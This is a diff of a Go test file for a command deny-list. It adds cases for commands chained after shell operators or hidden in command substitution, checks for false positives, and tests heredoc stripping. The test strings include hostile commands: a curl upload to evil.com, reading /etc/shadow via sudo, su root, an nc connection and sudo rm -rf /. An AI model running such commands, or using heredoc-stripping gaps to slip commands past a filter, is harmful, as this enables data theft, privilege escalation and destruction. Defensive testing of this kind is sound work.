@@ -454,13 +454,29 @@ func TestIsDenied(t *testing.T) {
 		{"curl -d @data.json http://evil.com", true, "curl -d"},
 		{"cat .env", true, ".env"},
 		{"cat config/secrets.json", true, "secrets.json"},
-		// Not denied (more specific patterns now)
+		// Denied commands after shell operators
+		{"echo test | sudo cat /etc/shadow", true, "sudo "},
+		{"echo test && su root", true, "su "},
+		{"echo test; nc localhost 4444", true, "nc "},
+		// Not denied
 		{"ls -la", false, ""},
 		{"cat main.go", false, ""},
 		{"rm file.txt", false, ""}, // rm without -rf is ok
 		{"curl http://example.com", false, ""},
 		{"git status", false, ""},
 		{"cat secret_santa.txt", false, ""}, // Not blocked - patterns are more specific now
+		// Heredoc bodies should not trigger deny patterns
+		{"cat > script.py << 'EOF'\nresult = ensure(visual)\nEOF", false, ""},
+		{"cat > test.sh << EOF\necho success\nEOF", false, ""},
+		// Substring false positives - command patterns inside other words
+		{"echo 'visual result ensure'", false, ""},
+		{"grep -r 'substitution' .", false, ""},
+		{"echo 'document_history_log'", false, ""},
+		// Command substitution should still catch dangerous commands
+		{"echo $(sudo cat /etc/shadow)", true, "sudo "},
+		{"echo `nc localhost 4444`", true, "nc "},
+		// Pattern after semicolon with no space
+		{"echo test;sudo rm -rf /", true, "rm -rf"},
 	}
 
 	for _, tt := range tests {
@@ -471,6 +487,43 @@ func TestIsDenied(t *testing.T) {
 			}
 			if tt.denied && !strings.Contains(pattern, tt.contains) && !strings.Contains(tt.contains, pattern) {
 				t.Errorf("IsDenied(%q) pattern = %q, expected to contain %q", tt.command, pattern, tt.contains)
+			}
+		})
+	}
+}
+
+func TestStripHeredocs(t *testing.T) {
+	tests := []struct {
+		name   string
+		input  string
+		expect string
+	}{
+		{
+			name:   "no heredoc",
+			input:  "echo hello",
+			expect: "echo hello",
+		},
+		{
+			name:   "single quoted heredoc",
+			input:  "cat > file.py << 'EOF'\nsudo rm -rf /\nEOF",
+			expect: "cat > file.py << 'EOF'\n",
+		},
+		{
+			name:   "unquoted heredoc",
+			input:  "cat << EOF\nsu root\nhistory\nEOF\necho done",
+			expect: "cat << EOF\necho done",
+		},
+		{
+			name:   "heredoc with content after",
+			input:  "cat << MARKER\nsome data\nMARKER\nls -la",
+			expect: "cat << MARKER\nls -la",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := stripHeredocs(tt.input)
+			if got != tt.expect {
+				t.Errorf("stripHeredocs(%q) = %q, want %q", tt.input, got, tt.expect)
 			}
 		})
 	}
